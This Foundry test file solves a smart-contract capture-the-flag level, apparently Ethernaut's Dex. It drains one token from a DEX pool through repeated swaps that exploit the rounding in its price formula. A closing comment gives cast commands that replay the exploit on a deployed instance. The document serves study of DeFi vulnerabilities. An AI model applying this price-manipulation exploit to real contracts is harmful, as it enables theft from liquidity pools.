// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;
    address public owner;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        owner = makeAddr("owner");
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);

        vm.startPrank(owner);
        dex = new Dex();
        token1 = new SwappableToken(address(dex), "Token1", "TK1", 1000 ether);
        token2 = new SwappableToken(address(dex), "Token2", "TK2", 1000 ether);

        token1.transfer(attacker, 10);
        token2.transfer(attacker, 10);
        dex.setTokens(address(token1), address(token2));
        dex.approve(address(dex), 100);
        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        vm.stopPrank();
    }

    function test_deployDex() public {
        vm.startPrank(attacker);

        assertEq(dex.owner(), owner);
        assertEq(dex.token1(), address(token1));
        assertEq(dex.token2(), address(token2));
        assertEq(token1.balanceOf(attacker), 10);
        assertEq(token2.balanceOf(attacker), 10);
        assertEq(token1.balanceOf(address(dex)), 100);
        assertEq(token2.balanceOf(address(dex)), 100);

        vm.stopPrank();
    }

    function test_attackDex() public {
        vm.startPrank(attacker);

        dex.approve(address(dex), 1000);

        uint256 price = dex.getSwapPrice(address(token2), address(token1), 10);
        console.log("Price: ", price);

        dex.swap(address(token1), address(token2), 10);
        assertEq(token1.balanceOf(attacker), 0);
        assertEq(token2.balanceOf(attacker), 20);
        price = dex.getSwapPrice(address(token2), address(token1), 20);
        console.log("Price: ", price);

        dex.swap(address(token2), address(token1), 20);
        assertEq(token1.balanceOf(attacker), 24);
        assertEq(token2.balanceOf(attacker), 0);
        price = dex.getSwapPrice(address(token1), address(token2), 24);
        console.log("Price: ", price);

        dex.swap(address(token1), address(token2), 24);
        assertEq(token1.balanceOf(attacker), 0);
        assertEq(token2.balanceOf(attacker), 30);
        price = dex.getSwapPrice(address(token2), address(token1), 30);
        console.log("Price: ", price);

        dex.swap(address(token2), address(token1), 30);
        assertEq(token1.balanceOf(attacker), 41);
        assertEq(token2.balanceOf(attacker), 0);
        price = dex.getSwapPrice(address(token1), address(token2), 41);
        console.log("Price: ", price);

        dex.swap(address(token1), address(token2), 41);
        assertEq(token1.balanceOf(attacker), 0);
        assertEq(token2.balanceOf(attacker), 65);
        price = dex.getSwapPrice(address(token2), address(token1), 45);
        console.log("Price: ", price);

        dex.swap(address(token2), address(token1), 45);

        assertEq(token1.balanceOf(address(dex)), 0);
        vm.stopPrank();
    }
}

/*
Instance address: 0xd5E10A56eC0e76036aFd66A57EDa79FBF7c579Eb
source .env
export dex=0xd5E10A56eC0e76036aFd66A57EDa79FBF7c579Eb
export token1=0xf68e37510af4c25e2399da902f2cb602d6d37a59
export token2=0x86fba44b6f0f3144b1ae719030cad272ae784f31
export attacker=0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd

cast call $token1 "balanceOf(address)" $attacker  --rpc-url $RPC_URL
cast call $token2 "balanceOf(address)" $attacker  --rpc-url $RPC_URL
cast call $dex "token1()" --rpc-url $RPC_URL
cast call $dex "token2()" --rpc-url $RPC_URL
cast call $dex "owner()" --rpc-url $RPC_URL

cast send $dex "approve(address, uint)" $dex 1000 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token1 $token2 10 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token2 $token1 20 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token1 $token2 24 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token2 $token1 30 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token1 $token2 41 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $dex "swap(address, address, uint)" $token2 $token1 45 --rpc-url $RPC_URL --private-key $PRIVATE_KEY

cast call $token1 "balanceOf(address)" $dex --rpc-url $RPC_URL
*/
